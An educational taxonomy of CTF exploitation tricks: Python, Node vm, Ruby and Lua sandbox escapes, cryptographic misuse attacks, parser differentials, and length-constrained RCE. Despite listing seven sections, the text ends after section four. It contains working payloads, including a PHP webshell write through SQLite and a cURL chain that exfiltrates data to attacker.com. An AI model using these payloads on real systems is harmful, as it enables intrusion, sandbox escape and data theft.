# CTF Exotic Tricks — Advanced Exploitation Primitives Taxonomy

> Exploitation primitives recurring in top-tier CTFs (Google CTF, PlaidCTF, HITCON CTF, DiceCTF, corCTF, SekaiCTF, DEF CON CTF, jailCTF, KalmarCTF) that **do not have dedicated taxonomy documents** in the-map. Each technique has demonstrated real-world applicability in bug bounties or penetration testing.
>
> **Scope**: This document covers only primitives not systematically addressed elsewhere. For topics with dedicated documents, see the cross-reference at the end. The three sections below represent vulnerability classes that recur in CTF contexts but lack a natural home in the existing category structure.

---

## Taxonomy Axes

| Axis | Description |
|------|------------|
| **Axis 1 — Primitive Class** | Structural category the trick belongs to |
| **Axis 2 — What is Manipulated** | The specific invariant, assumption, or mechanism being violated |
| **Axis 3 — Exploitation Outcome** | Concrete impact: oracle construction, RCE, data exfiltration, sandbox escape |

---

## Table of Contents

1. [Sandbox & Jail Escape Primitives](#1-sandbox--jail-escape-primitives)
2. [Cryptographic Misuse Primitives](#2-cryptographic-misuse-primitives)
3. [Non-HTTP Parser Differentials](#3-non-http-parser-differentials)
4. [Constrained Exploitation Primitives](#4-constrained-exploitation-primitives)
5. [Browser-Native Side Channels & Mechanism Abuse](#5-browser-native-side-channels--mechanism-abuse)
6. [Competition → Technique Cross-Reference](#6-competition--technique-cross-reference)
7. [Cross-Reference to Dedicated Documents](#7-cross-reference-to-dedicated-documents)

---

## 1. Sandbox & Jail Escape Primitives

> Language-level sandbox and jail escapes — techniques to achieve code execution or data exfiltration within intentionally restricted interpreter environments. These are the backbone of "jail" challenges across all major CTFs and are directly applicable to real-world sandbox products (online code editors, Jupyter notebooks, serverless function runtimes, CI/CD runners).

### 1.1 Python Jail Escapes

#### 1.1.1 Garbage Collector Memory Archaeology (`gc.get_objects()` / `gc.get_referrers()`)

**What is manipulated**: Python's garbage collector tracks all objects in memory, including those in "deleted" or "private" scopes. The `gc` module provides direct traversal of the entire object graph.

```python
import gc

# Find all string objects containing 'FLAG':
[obj for obj in gc.get_objects() if isinstance(obj, str) and 'FLAG' in obj]

# Find function objects and inspect their globals:
funcs = [obj for obj in gc.get_objects() if callable(obj) and hasattr(obj, '__globals__')]
for f in funcs:
    if 'secret' in f.__globals__:
        print(f.__globals__['secret'])

# Reverse reference traversal — find what references a target object:
target = [obj for obj in gc.get_objects() if isinstance(obj, dict) and 'password' in obj]
gc.get_referrers(target[0])  # reveals which module/function holds the secret dict
```

**Variant — `numpy.genfromtxt()` file read** (KalmarCTF 2025): When `open()` and `os` are blocked but `numpy` is available:
```python
import numpy
numpy.genfromtxt('/etc/passwd', dtype=str, delimiter='\n')
```

**Other library-based file reads when `open` is blocked**:
| Library | Method | Example |
|---------|--------|---------|
| `numpy` | `genfromtxt()` / `loadtxt()` | `numpy.loadtxt('/etc/passwd', dtype=str)` |
| `pandas` | `read_csv()` / `read_table()` | `pandas.read_csv('/etc/passwd', sep='\n', header=None)` |
| `pathlib` | `Path.read_text()` | `pathlib.Path('/etc/passwd').read_text()` |
| `fileinput` | `input()` | `list(fileinput.input('/etc/passwd'))` |
| `tokenize` | `open()` | `tokenize.open('/etc/passwd').read()` |
| `xml.etree` | `parse()` — reads well-formed XML files only | `xml.etree.ElementTree.parse('/flag.xml')` — note: `xml.etree` does NOT expand external entities by default and will raise `ParseError` on non-XML files like `/etc/passwd`. This is an XML file reader, not an XXE vector |
| `linecache` | `getlines()` | `linecache.getlines('/etc/passwd')` |
| `pkgutil` | `get_data()` | `pkgutil.get_data('.', '/etc/passwd')` |

#### 1.1.2 `help()` as Universal Import Primitive

**What is manipulated**: Python's `help()` function internally imports modules to display their documentation. In jails where `import` / `__import__` are blocked, `help()` sidesteps the restriction.

```python
# SECCON CTF 2024 Quals:
help()  # enters interactive help
# type: modules  → lists all importable modules
# type: os  → imports os module to show its help
# After help() exits, os is now in sys.modules and accessible

import sys
sys.modules['os'].system('id')
```

**Variant — `importlib` reload**: If a module was previously imported but references were deleted:
```python
import importlib
importlib.import_module('os').system('id')
```

**Variant — `pkgutil.walk_packages()`**: Enumerates and triggers import of all findable packages.

#### 1.1.3 Metaclass Hooks: `__init_subclass__` / `__set_name__` / `__class_getitem__`

**What is manipulated**: Python metaclass hooks execute arbitrary code at class *definition time*, without explicit `eval`/`exec`. If the jail blocks function calls but permits class definitions, these hooks provide execution.

```python
# __init_subclass__ — triggers when a subclass is defined:
class X:
    def __init_subclass__(cls, **kwargs):
        __import__('os').system('id')

class Y(X):  # defining Y triggers __init_subclass__ → RCE
    pass
```

```python
# __set_name__ — triggers when a descriptor is assigned as a class attribute:
class Descriptor:
    def __set_name__(self, owner, name):
        __import__('os').system('id')

class X:
    attr = Descriptor()  # triggers __set_name__ → RCE
```

```python
# __class_getitem__ — triggers on class subscription:
class X:
    def __class_getitem__(cls, item):
        __import__('os').system('id')

X['anything']  # triggers __class_getitem__ → RCE
```

```python
# __del__ — triggers on object destruction:
class Evil:
    def __del__(self):
        __import__('os').system('id')

e = Evil()
del e  # or let it go out of scope
```

#### 1.1.4 Walrus Operator + Comprehension Scope Leaking

**What is manipulated**: Python 3.8+ walrus operator (`:=`) leaks bindings from comprehension scope to the enclosing scope, bypassing scope isolation.

```python
# Leak import result out of a comprehension:
[y := __import__('os') for x in [1]]
y.system('id')  # y is now accessible in the outer scope

# Chain with attribute access where direct import is blocked:
[z := ''.__class__.__mro__[1].__subclasses__() for _ in [1]]
# z now contains the subclass list in the outer scope
```

**Exception variable scope abuse**:
```python
try:
    1/0
except Exception as e:
    # Python 3 deletes 'e' after the except block, but:
    result = e.__class__.__base__.__subclasses__()
# result survives the block
```

#### 1.1.5 Code Object Surgery (Bytecode Manipulation)

**What is manipulated**: Python code objects (`types.CodeType`) can be constructed with arbitrary bytecode, bypassing AST-level source code auditing.

```python
import types

# Build a code object from raw bytecode:
# This bypasses any AST-based sanitizer because there is no source to parse.
#
# Strategy:
# 1. Obtain a reference to a dangerous function via __subclasses__ or gc
# 2. Extract its code object or build one from scratch
# 3. Wrap in a function and call

# Example: replace a function's code object
def dummy(): pass

# Craft new code object with different bytecode
new_code = dummy.__code__.replace(
    co_code=bytes([100, 0, 83, 0]),  # LOAD_CONST 0, RETURN_VALUE
    co_consts=(None,)
)
dummy.__code__ = new_code
```

**jailCTF 2025**: Multiple challenges required bytecode-level construction to escape environments that audited the AST (using `ast.parse` + `ast.walk`) but not the bytecode.

**Variant — `ctypes` for memory manipulation**: If `ctypes` is available:
```python
import ctypes
# Directly manipulate Python object internals in memory
# Modify refcount, type pointers, or function code pointers
```

#### 1.1.6 Built-in Function Abuse for Import-Free Execution

When `import`, `__import__`, `eval`, `exec`, `compile` are all blocked:

| Technique | Mechanism | Example |
|-----------|-----------|---------|
| **`breakpoint()`** | Drops into `pdb` debugger which has full Python access | `breakpoint()` → `import os; os.system('id')` at pdb prompt |
| **`license()`** | Opens pager, which may invoke shell commands | `license()` → input redirection to shell |
| **`exit.__class__.__call__`** | Abuse Quitter objects to access `__call__` chain | Traverse to `__builtins__` via `exit.__class__` |
| **`print.__class__`** | Traverse from any built-in to `type` → `__subclasses__` | `print.__class__.__base__.__subclasses__()` |
| **`type.__subclasses__(type)`** | Enumerate all metaclasses → reach module types | Find `_ModuleLock` or similar → access `sys.modules` |
| **f-string eval** | `f"{__import__('os').system('id')}"` — sometimes allowed when `eval()` is blocked | `f"{''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True)}"` |

#### 1.1.7 Audit Hook Bypass Techniques

Python 3.8+ added `sys.addaudithook()` for monitoring sensitive operations. CTF jails increasingly use this.

| Technique | Mechanism |
|-----------|-----------|
| **`os.kill` + signal** | Some audit hooks don't monitor signal delivery; send signal to own process to trigger handler |
| **`ctypes` native call** | C-level calls bypass Python audit hooks entirely |
| **Segfault handler** | Cause a controlled segfault, use signal handler for code execution |
| **Thread-level escape** | Start a thread before audit hook is installed; thread inherits pre-hook state |
| **`_thread._set_sentinel`** | Internal thread API not covered by standard audit events |

#### 1.1.8 `sys.settrace()` / `sys.setprofile()` Execution Hooks

```python
import sys

# settrace: called on every line, call, return, exception
def tracer(frame, event, arg):
    if event == 'call' and frame.f_code.co_name == 'check_password':
        frame.f_locals['password'] = 'attacker_value'
        # Or: inspect frame.f_locals to steal secrets
    return tracer

sys.settrace(tracer)
```

**Key insight**: Even if a jail prevents you from *calling* sensitive functions, `settrace` lets you intercept and inspect execution at every point — including reading local variables of protected functions. **Version caveat**: Writing to `frame.f_locals` to modify actual local variables works reliably in Python 3.13+ (which introduced write-through `FrameLocalsProxy`). In earlier CPython versions, `frame.f_locals` returns a snapshot copy — writes may not propagate to the actual locals. Reading locals works in all versions.

### 1.2 JavaScript Sandbox Escapes (Node.js `vm` Module)

> Node.js `vm` module creates "sandboxed" contexts, but it was never designed as a security boundary. These escapes are relevant to any application using `vm.runInNewContext()`, `vm.createContext()`, or `vm2` (now deprecated).

#### 1.2.1 `constructor.constructor` Classic Escape

```javascript
// Inside vm sandbox:
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString();
```

**Why it works**: `this.constructor` is `Object`, and `Object.constructor` is `Function`. `Function('return process')()` creates a function in the host realm and returns the host's `process` object.

#### 1.2.2 `WeakRef` / `FinalizationRegistry` Realm Escape

**What is manipulated**: In certain sandbox implementations (notably `vm2`, now deprecated), `FinalizationRegistry` callbacks could execute in the *host* realm after garbage collection. Note: this behavior is specific to sandbox libraries that wrap `node:vm` — native `node:vm` does not inherently guarantee host-realm callback execution for `FinalizationRegistry`. The technique is closely related to vm2 escape CVEs (e.g., CVE-2023-32314).

```javascript
// Inside vm sandbox:
const fr = new FinalizationRegistry((ref) => {
    // This callback runs in host context — full access to process, require, etc.
    const cp = ref.constructor.constructor('return process')()
                  .mainModule.require('child_process');
    cp.execSync('id');
});

fr.register({}, 'ref-value');
// Trigger GC (implementation-dependent — allocate heavily to pressure GC)
```

#### 1.2.3 `import()` Dynamic Import Escape

```javascript
// vm sandbox context:
import('child_process').then(cp => {
    cp.execSync('id');
});
// import() resolves in the host module system, not the sandbox
```

**Key condition**: Requires `--experimental-vm-modules` flag and the `importModuleDynamically` option to be set on the `vm.Script` or `vm.compileFunction` call. This is NOT available by default — the host must explicitly opt in to dynamic import support for vm contexts. Without these conditions, `import()` inside a vm context will throw.

#### 1.2.4 Proxy `apply` Trap — `argumentsList` Realm Leak

**What is manipulated**: In sandbox libraries like `vm2`, when a Proxy's `apply` trap is invoked across realm boundaries, the third argument (`argumentsList`) could be a real JavaScript Array allocated in the *host* realm, leaking access to the host context's `Object.prototype`. This technique is associated with vm2 CVE-2023-32314 and similar vm2 escapes — it does not apply to native `node:vm` in the same way, as native `vm` was never designed as a security boundary.

```javascript
// DiceCTF 2023 "jwtjail":
// Inside vm sandbox:
const handler = {
    apply(target, thisArg, argumentsList) {
        // argumentsList is an Array from the HOST realm!
        // argumentsList.constructor → host's Array
        // argumentsList.constructor.constructor → host's Function
        const hostFunction = argumentsList.constructor.constructor;
        const process = hostFunction('return process')();
        process.binding('spawn_sync').spawn({
            file: '/bin/sh',
            args: ['/bin/sh', '-c', 'id'],
            stdio: [{type: 'pipe'}, {type: 'pipe'}, {type: 'pipe'}]
        });
    }
};

const proxy = new Proxy(function(){}, handler);
proxy();  // triggers apply trap → escape
```

**Why it works**: In vm2's sandbox wrapping, V8 allocates the arguments array for `Proxy.apply` traps in the calling realm (host), not the proxy's realm (sandbox). This was a fundamental issue in vm2's isolation model — it does not apply to native `node:vm` which makes no security isolation guarantees.

#### 1.2.5 `vm2` Historical Escapes (Pre-Deprecation)

`vm2` (now deprecated, replaced by `isolated-vm`) had a history of sandbox escapes:

| CVE | Mechanism | Version |
|-----|-----------|---------|
| CVE-2023-37466 | `Promise` `@@species` accessor property sandbox escape | vm2 ≤ 3.9.19 (no fix; project deprecated) |
| CVE-2023-32314 | Unexpected host object creation via `Proxy` specification | vm2 < 3.9.18 |
| CVE-2023-29199 | Source transformer exception sanitization bypass | vm2 < 3.9.16 |
| CVE-2022-36067 | `Error().prepareStackTrace` callback runs in host | vm2 < 3.9.11 |

**Lesson**: `vm2` was patched and re-broken repeatedly. If you encounter it in a CTF, search for the specific version's known escapes first.

### 1.3 Ruby Sandbox / Jail Escapes

| Technique | Mechanism |
|-----------|-----------|
| **`send()` method dispatch** | `"".send(:system, "id")` — `send` bypasses visibility checks (private/protected) |
| **`instance_eval` / `class_eval`** | Evaluate arbitrary code in the context of any object/class |
| **`Kernel#__method__` traversal** | `method(:system).call("id")` — obtain Method object, call it |
| **`ObjectSpace.each_object`** | Enumerate all live Ruby objects (like Python's `gc.get_objects`) |
| **`Fiddle` FFI** | Direct C function calls: `Fiddle::Function.new(Fiddle::Handle['system'], [Fiddle::TYPE_VOIDP], Fiddle::TYPE_INT).call("id")` |
| **ERB `binding`** | `ERB.new("<%= system('id') %>").result(binding)` — if ERB is available |

### 1.4 Lua Sandbox Escapes

| Technique | Mechanism |
|-----------|-----------|
| **`debug.getregistry()`** | Access the Lua registry — contains references to all loaded C functions |
| **`debug.getinfo()` + `debug.getupvalue()`** | Inspect and modify upvalues of any function, including sandboxed ones |
| **`load()`/`loadstring()` bytecode** | Load pre-compiled Lua bytecode that bypasses source-level sandboxing |
| **`os.execute` via `debug` module** | If `debug` library is loaded: traverse from `debug.getregistry` to `os` |
| **Metatable manipulation** | `getmetatable("").__index = os` — inject `os` functions into string metatable |

---

## 2. Cryptographic Misuse Primitives

> Cryptographic attacks that recur in top-tier CTFs and have direct real-world applicability. These go beyond textbook padding oracle and hash length extension — the focus is on **misuse patterns** where correct algorithms are deployed incorrectly.

### 2.1 ECDSA Nonce Reuse → Private Key Recovery

**What is manipulated**: ECDSA security depends entirely on the uniqueness of the per-signature nonce `k`. If the same `k` is used for two different messages, the private key is algebraically recoverable.

```
Given two signatures (r, s1) and (r, s2) for messages m1 and m2:
  k = (m1 - m2) / (s1 - s2) mod n
  private_key = (s1 * k - m1) / r mod n
```

**Detection**: Two signatures sharing the same `r` value indicates nonce reuse (since `r = (k * G).x`).

**Practical sources of nonce reuse**:
- `k = HMAC(private_key, message)` but message is constant (e.g., health check signing, repeated API calls)
- Poor entropy source during key generation (VM snapshot restore, container restart — entropy pool reset)
- Deterministic ECDSA (RFC 6979) with identical inputs across different signing contexts
- Sony PS3 ECDSA key extraction (used a static/constant nonce `k` for all signatures; the value was not literally 4 despite popular myth — fail0verflow confirmed this at 27C3)

**Partial nonce leak (LadderLeak, Minerva)**: Even leaking a few bits of the nonce per signature enables lattice-based private key recovery with enough signatures (~100 signatures with 2-bit leaks).

### 2.2 AES-GCM Nonce Reuse → Authentication Key Recovery + Forgery

**What is manipulated**: GCM mode derives both the encryption keystream and the GHASH authentication key from the same (key, nonce) pair. Reusing a nonce reveals the authentication key `H`, enabling ciphertext forgery.

```
Given two ciphertexts C1, C2 encrypted with the same (key, nonce):
  C1 ⊕ C2 = P1 ⊕ P2  (keystream cancels — plaintext XOR recovery)

And authentication tags T1, T2:
  T1 ⊕ T2 = GHASH_H(C1 || len1) ⊕ GHASH_H(C2 || len2)
  → Solve polynomial equation over GF(2^128) to recover H
  → Forge valid authentication tags for arbitrary ciphertexts
```

**Real-world occurrences**:
- JWT libraries using AES-GCM with static/predictable IVs
- TLS 1.2 servers with nonce mismanagement
- Cloud KMS implementations with counter wrap-around

### 2.3 RSA Attacks Beyond Textbook

#### 2.3.1 Bleichenbacher's Attack on PKCS#1 v1.5

**What is manipulated**: The server reveals (via error message, timing, or behavior difference) whether RSA-decrypted ciphertext has valid PKCS#1 v1.5 padding (starts with `0x00 0x02`). This 1-bit oracle enables full plaintext recovery.

```
For each guess:
  c' = c * s^e mod n  (multiply ciphertext by s^e for chosen s)
  Send c' to server
  If server says "valid padding" → s constrains the plaintext range
  Iterate: narrow the interval until plaintext is determined
```

**Complexity**: ~1 million queries for a 2048-bit RSA key.

**Modern variants**:
| Attack | Year | Impact |
|--------|------|--------|
| ROBOT | 2017 | Bleichenbacher oracles in F5, Citrix, Cisco, Palo Alto TLS |
| DROWN | 2016 | SSLv2 oracle to decrypt TLS 1.2 sessions |
| CAT | 2023 | Bleichenbacher-variant in TLS implementations via Marvin attack |

#### 2.3.2 Coppersmith's Method (Partial Key Exposure)

**What is manipulated**: If partial bits of an RSA private key `d` are known (e.g., lower 25% leaked via side-channel, memory dump, or corrupted key file), the full key can be reconstructed using lattice reduction.

```python
# SageMath:
# Given n, e, and partial d (e.g., lower 512 bits of a 2048-bit key):
d_low = 0x...  # known lower bits
# Construct polynomial: e * d_low ≡ 1 (mod 2^512) → factor n
# Apply Coppersmith's small_roots() to find the full d
```

**PlaidCTF 2025 (Tales from the Crypt)**: Recovering a corrupted RSA private key from a pcap containing TLS traffic — partial key exposure + lattice techniques → full key → session decryption.

#### 2.3.3 Hastad's Broadcast Attack

**What is manipulated**: When the same plaintext is encrypted with RSA (small `e`, typically `e=3`) to multiple recipients with different moduli, CRT reconstruction recovers the plaintext.

```
Given: c1 = m^3 mod n1, c2 = m^3 mod n2, c3 = m^3 mod n3
CRT: C = c1*N1*y1 + c2*N2*y2 + c3*N3*y3 (mod n1*n2*n3)
m = ∛C (integer cube root, since m^3 < n1*n2*n3)
```

#### 2.3.4 Franklin-Reiter Related Message Attack

**What is manipulated**: If two RSA ciphertexts encrypt messages with a known linear relationship (`m2 = a*m1 + b`), the plaintext can be recovered without the private key.

```
Given: c1 = m1^e mod n, c2 = (a*m1 + b)^e mod n
When e = 3: polynomial GCD over Z/nZ recovers m1
```

**CTF pattern**: Common when a server encrypts a user-controlled message with a fixed prefix/suffix (e.g., `flag + user_input`).

### 2.4 CBC Padding Oracle as Encryption Oracle

**What is usually missed**: A padding oracle doesn't only **decrypt** — it also **encrypts** arbitrary plaintext, without knowing the key.

```
Standard: Ciphertext → Plaintext (decryption oracle)

Reverse (encryption oracle):
  For desired plaintext block P_n:
    Choose random C_n (final ciphertext block)
    Use padding oracle to discover intermediate value I_n for C_n
    Compute C_{n-1} = I_n ⊕ P_n
    Repeat backward through all blocks
  → Produces valid ciphertext for arbitrary plaintext

Cost: 256 × block_count oracle queries per plaintext block
```

**Impact escalation**: This turns a **read** primitive (decryption) into a **write** primitive (forging valid encrypted tokens). If the application uses CBC-encrypted cookies for authorization, a padding oracle becomes an admin token forge.

### 2.5 PRNG State Recovery from Partial / Transformed Output

> Beyond the textbook "collect 624 consecutive 32-bit outputs to clone Mersenne Twister" — real CTF scenarios involve partial, truncated, or transformed outputs.

#### 2.5.1 Z3 Symbolic Solver Approach

```python
# Google CTF 2025 (Postviewer v5):
# Random values were encoded as base36 strings → only 5-6 chars visible per output
# Each value constrains a few bits of the MT state

from z3 import *

# Create symbolic MT state (624 × 32-bit BitVecs)
state = [BitVec(f's{i}', 32) for i in range(624)]
solver = Solver()

# For each observed partial output:
#   1. Symbolically compute the MT tempering transformation
#   2. Add constraint: lower N bits == observed value
# Example for truncated output (lower 16 bits only):
for i, observed in enumerate(observations):
    symbolic_output = temper(state, i)  # symbolic MT output
    solver.add(Extract(15, 0, symbolic_output) == observed)

if solver.check() == sat:
    model = solver.model()
    recovered_state = [model[s].as_long() for s in state]
```

#### 2.5.2 Common Partial Observation Scenarios

| Scenario | Observable | Bits per Output | Outputs Needed |
|----------|-----------|----------------|----------------|
| Full MT output | All 32 bits | 32 | 624 |
| Lower 16 bits only | `rand() & 0xFFFF` | 16 | ~1,250 |
| Modular reduction | `rand() % N` | log2(N) | Varies |
| Base36 encoding | 5-6 character string | ~26 | ~800 |
| Float [0,1) | `rand() / 2^32` | ~23 (mantissa) | ~900 |
| Boolean | Coin flip | 1 | ~20,000 |

**Tools**: `symbolic_mersenne_cracker` (Python/Z3), `randcrack` (624-output case), `php_mt_seed` (PHP mt_rand).

### 2.6 Hash Length Extension Attack Variants

While the basic hash length extension (MD5, SHA-1, SHA-256) is well-known, CTFs feature variants:

| Variant | Mechanism |
|---------|-----------|
| **Double HMAC bypass** | `H(secret || H(secret || msg))` — if inner hash is accessible, extend the outer |
| **Truncated hash extension** | Hash output is truncated; extension still works, but forged tag has multiple valid extensions (collision space) |
| **Custom Merkle-Damgård constructions** | CTF-custom hash functions with MD construction — same extension principle applies |
| **HMAC-then-encrypt** | If MAC is computed before encryption, padding oracle + length extension combine |

---

## 3. Non-HTTP Parser Differentials

> Parser inconsistencies that create security-relevant discrepancies in **non-HTTP** data formats. HTTP-level parser differentials (request smuggling, URL confusion, header parsing) are covered in dedicated documents. This section covers format-level differentials that surface in CTFs and real-world multi-service architectures.

### 3.1 YAML 1.1 vs 1.2 Boolean Parsing

**What is manipulated**: YAML 1.1 treats `yes`, `no`, `on`, `off`, `y`, `n` as booleans. YAML 1.2 removed this — they're strings.

```yaml
# YAML 1.1 (Ruby's Psych, Python's PyYAML):
admin: no      # parsed as: admin: false
country: no    # parsed as: country: false (not the string "no"!)

# YAML 1.2 (Go's yaml.v3, Rust's serde_yaml, newer parsers):
admin: no      # parsed as: admin: "no" (string)
```

**Parser version mapping**:

| Language/Library | YAML Version | `no` Parses As |
|-----------------|-------------|----------------|
| Python PyYAML (`yaml.load`) | 1.1 | `False` |
| Python PyYAML (`yaml.safe_load`) | 1.1 | `False` |
| Python strictyaml | 1.2 | `"no"` |
| Ruby Psych | 1.1 | `false` |
| Go `gopkg.in/yaml.v2` | 1.1 | `false` |
| Go `gopkg.in/yaml.v3` | 1.2 | `"no"` |
| JavaScript `js-yaml` | 1.2 (default) | `"no"` |
| Rust `serde_yaml` | 1.2 | `"no"` |

**Exploitation scenarios**:
- **Auth bypass via config**: YAML config file `require_2fa: no` (intended as "not configured") parsed as `false` by a 1.1 parser → 2FA disabled
- **Country code bug**: Norway (`NO`) in a YAML config parsed as boolean `false` → downstream validation failures. This was a real GitHub Actions bug.
- **Cross-service differential**: Service A (Python) writes YAML with `enabled: no` meaning string "no". Service B (Go yaml.v2) reads it as boolean `false`.

### 3.2 JSON Superset Differentials (JSON5 / JSONC / Relaxed JSON)

**What is manipulated**: Some systems accept JSON5, JSONC, or "relaxed JSON" while validators/WAFs check strict JSON. Discrepancies in comment handling, trailing commas, and quote styles create injection opportunities.

```javascript
// Comment injection — passes strict JSON validator, comment interpreted by JSON5 parser:
{
  "role": "user" // ,"role": "admin"
}
// Strict JSON validator: sees "role": "user" (rest is syntax error, but some validators are lenient)
// JSON5 parser: ignores comment, but if the parser is buggy or the comment trick works with newlines:

// Trailing comma differential:
{"a": 1, "b": 2,}  // Valid JSON5, invalid strict JSON

// Single quotes:
{'role': 'admin'}  // Valid JSON5, invalid strict JSON

// Multiline strings:
{"cmd": "first \
second"}  // JSON5 allows backslash-newline continuation

// Hexadecimal numbers:
{"port": 0x1F90}  // JSON5: 8080, strict JSON: invalid

// Infinity/NaN:
{"val": Infinity}  // JSON5: valid, strict JSON: invalid
```

**Real-world**: Configuration files processed by JSON5-compatible loaders (`tsconfig.json`, VS Code settings) where input validation uses strict JSON parsing.

### 3.3 Regex Engine Differentials

**What is manipulated**: Different regex engines (PCRE, PCRE2, RE2, JavaScript, Python `re`, Java `Pattern`) handle edge cases differently, creating bypass opportunities when a WAF uses one engine and the application uses another.

| Differential | Engine A | Engine B | Exploitation |
|-------------|----------|----------|-------------|
| **`[A-z]` range** | Includes `[\]^_\`` (ASCII 91-96) | Some engines reject as invalid | Google CTF 2024 "Grand Prix Heaven" — path validation bypass via `\` in `[A-z]` range |
| **Backtracking limits** | PCRE has configurable `pcre.backtrack_limit` | RE2 is non-backtracking (linear time) | PCRE regex times out (returns error), RE2 always completes |
| **Possessive quantifiers** | PCRE/Java support `a++` | Python `re` does not | Regex written for PCRE, tested on Python — different matching behavior |
| **Unicode category `\p{}`** | Java/PCRE2 support `\p{L}` | JavaScript (ES2018+) requires `/u` flag | Unicode letter bypasses depending on flag/engine |
| **`\b` word boundary** | ASCII-only in most engines | Unicode-aware in some | Boundary mismatch for multibyte characters |
| **Named captures** | `(?P<name>)` (Python) vs `(?<name>)` (JS/PCRE2) | Syntax differs | Cross-language regex portability bugs |
| **Newline handling** | `$` matches `\n` in some modes | `$` matches only end-of-string in others | Multiline injection past `$`-anchored patterns |

### 3.4 Encoding Differential Between Processing Stages

**What is manipulated**: When an input passes through multiple processing stages that handle encoding differently, the transformation pipeline creates injection opportunities.

| Stage Differential | Mechanism | Example |
|-------------------|-----------|---------|
| **Chunked encoding per-chunk charset** | Validator reads entire file in one charset; browser processes each chunk with potentially different encoding | HITCON CTF 2024 "HTML Upload" |
| **BOM (Byte Order Mark) injection** | Prepending UTF-8 BOM (`\xEF\xBB\xBF`) causes some parsers to switch encoding mode, others to ignore it | JSON parser ignores BOM; XML parser changes encoding |
| **Double encoding across services** | Service A URL-decodes once, Service B URL-decodes again | `%2527` → Service A: `%27` → Service B: `'` |
| **Charset mismatch in `<meta>` vs HTTP header** | HTTP header says `utf-8`; HTML `<meta charset="shift-jis">` — browser follows one, WAF follows the other | Multibyte character eating backslash in Shift-JIS |

---

## 4. Constrained Exploitation Primitives

> Techniques born from CTF challenges that impose extreme constraints — 4-byte command length limits, single bit-flips, 30-byte SQL injection windows. These constraints force the invention of genuinely novel exploitation primitives that have no analogue in standard vulnerability taxonomies. The techniques here are directly applicable to real-world scenarios where WAFs, input length limits, or restricted environments create similar constraints.

### 4.1 Filesystem as Command Assembly Buffer (4–5 Byte RCE)

**What is manipulated**: When command execution is limited to N characters per invocation, the filesystem itself becomes a Turing-complete assembly buffer — file *names* encode command fragments, and `ls` output order reconstructs the full command.

**5-byte variant** (HITCON CTF 2017 "Babyfirst Revenge"):
```bash
# Each HTTP request executes: exec(input) where len(input) <= 5
# Strategy: create files whose names are command fragments, then assemble

>dir        # create empty file named "dir"
>sl         # create empty file named "sl"
>g\>        # create file named "g>"
>ht-        # create file named "ht-"
*>v         # glob-expand all filenames and write to file "v"
            # v now contains: "dir sl g> ht-" (or similar, depending on glob order)

>rev        # create file named "rev"
*v>x        # run "rev" on "v" contents → produces "ls -th >g" (reversed)
sh x        # execute "ls -th >g" — list files sorted by time into file "g"
sh g        # execute the assembled command in file "g"
```

**4-byte variant** (HITCON CTF 2017 "Babyfirst Revenge v2"): Same principle but requires additional tricks — `rev` command to reverse strings, continuation-line backslashes (`\`) split across multiple filenames, and glob expansion as an intermediate processing step.

**Key insight**: This is essentially a write-primitive-to-RCE chain using only the filesystem. Applicable whenever:
- Command length is severely restricted (WAF, input validation)
- Multiple command invocations are possible (e.g., repeated HTTP requests)
- The filesystem is writable and listable

### 4.2. SQLite `VACUUM INTO` as File-Write Primitive

**What is manipulated**: SQLite's `VACUUM INTO('path')` command dumps the entire database contents into a new file at an arbitrary path — converting SQL injection into arbitrary file write.

**HITCON CTF 2025 "Pholyglot"**: 30-character SQL injection into an INSERT statement.
```sql
-- Injected payload (≤30 chars):
');VACUUM INTO('f.php

-- Full assembled query:
INSERT INTO t VALUES('');VACUUM INTO('f.php')

-- Multi-stage exploitation:
-- 1. First requests: INSERT PHP code fragments into the database
-- 2. Final request: VACUUM INTO writes the DB (containing PHP code) to a .php file
-- 3. The PHP webshell is now accessible via HTTP
```

**Key conditions**:
- SQLite database (common in mobile apps, embedded systems, small web apps)
- SQL injection with statement termination (`;`)
- Writable filesystem path accessible via web

**Variant — SQLite `ATTACH DATABASE`**: Similar file-write primitive: `ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.x(d TEXT); INSERT INTO pwn.x VALUES('<?php system($_GET["c"]); ?>');`

### 4.3 TCP Port Reflection for Eval Injection

**What is manipulated**: When a server-side application scans TCP ports and evaluates responses, the attacker finds or creates a service that echoes back attacker-controlled data in the expected format.

**HITCON CTF 2025 "No Man's Echo"**: PHP script scans 43 ports starting from user-controlled offset, sends `php://input` to each, and `eval()`s any response matching `{"signal":"Arrival","logogram":"..."}`.

```
Attack:
  1. Find a TCP service on the host that echoes input (SMTP banner, FTP, Redis, etc.)
  2. Craft input so the echo produces valid JSON with PHP code in "logogram"
  3. Set the port scan offset to hit the reflecting service
  4. Server eval()s the reflected PHP code → RCE
```

### 4.4 Apache `mod_negotiation` Content-Type Bypass

**What is manipulated**: Apache's MultiViews content negotiation serves files with inferred Content-Types that differ from the upload directory's restrictions.

**HITCON CTF 2020 "oStyle"**: Upload directory has `php_flag engine off` (no PHP execution). But `mod_negotiation` with `MultiViews` enabled allows Apache to serve an uploaded `.html` file with `text/html` Content-Type based on content negotiation, bypassing the "no execution" restriction and enabling stored XSS.

### 4.5 ASP.NET Request Validation as Security Check Bypass

**What is manipulated**: ASP.NET's Request Validation throws exceptions on inputs containing `<`, `>`, etc. If error handling swallows this exception, security checks in the same try block are skipped.

**HITCON CTF 2019 "Buggy .Net"**:
```csharp
bool isBad = false;
try {
    if (Request.Form["filename"].Contains(".."))  // security check
        isBad = true;
} catch { }  // Request Validation exception swallowed here

if (!isBad) {
    // isBad is still false because the Contains() check never ran
    File.ReadAllText("C:\\inetpub\\wwwroot\\" + filename);  // path traversal
}
```

**Payload**: `filename=..\..\etc\passwd<` — the `<` triggers Request Validation exception before the `..` check executes, so `isBad` stays `false`.

### 4.6 cURL Config File Chaining for Raw TCP

**What is manipulated**: When `gopher://` is unavailable, cURL's `--config` (`-K`) option chains multiple cURL invocations through config files to achieve raw TCP communication.

**DiceCTF 2023 "unfinished"**: SSRF to MongoDB (Wire Protocol over TCP) without gopher support.
```
Stage 1: Write a cURL config file to disk using -o
  curl http://attacker.com/config.txt -o /tmp/curl.conf

Stage 2: Execute cURL with the config file to send raw MongoDB Wire Protocol
  curl -K /tmp/curl.conf
  # Config contains: url = "telnet://127.0.0.1:27017"
  # Plus binary data for MongoDB query

Stage 3: Upload the response (containing flag) to attacker server
  curl -T /tmp/mongo_response http://attacker.com/exfil
```

---

